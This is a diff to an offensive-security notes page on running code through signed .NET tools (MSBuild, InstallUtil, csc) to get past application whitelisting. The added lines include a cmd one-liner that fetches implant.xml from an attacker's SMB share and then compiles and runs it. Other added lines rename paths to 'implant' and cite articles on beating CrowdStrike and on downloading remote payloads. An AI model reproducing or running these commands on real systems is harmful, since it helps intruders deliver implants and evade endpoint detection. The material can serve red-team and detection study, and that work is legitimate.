@@ -8,16 +8,22 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe implant.csproj
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe implant.xml
 ```
 
+```
+C:\> cmd /V /c "set COMPILER="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !COMPILER! /noautoresponse /preprocess \\<attacker_IP>\<share_name>\implant.xml > implant.xml & !COMPILER! implant.xml"
+```
+
 ## InstallUtil
 
+https://gist.github.com/Meatballs1/36fea5961ba7340821b1
+
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Microsoft.NET\Framework\v4.0.30319\temp.exe
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\implant.exe
 ```
 
 ### CSC
 
 ```
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\experiments\installUtil\temp.cs
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\path\to\implant.cs
 ```
 
 ---
@@ -50,3 +56,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe C:\experiments\installUtil
 ### Secarma
 
 - [Secarma: Three ways of using MSBuild to beat CrowdStrike](https://secarma.com/three-ways-of-using-msbuild-to-beat-crowdstrike/)
+
+### arno0x0x
+
+- [arno0x0x: Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
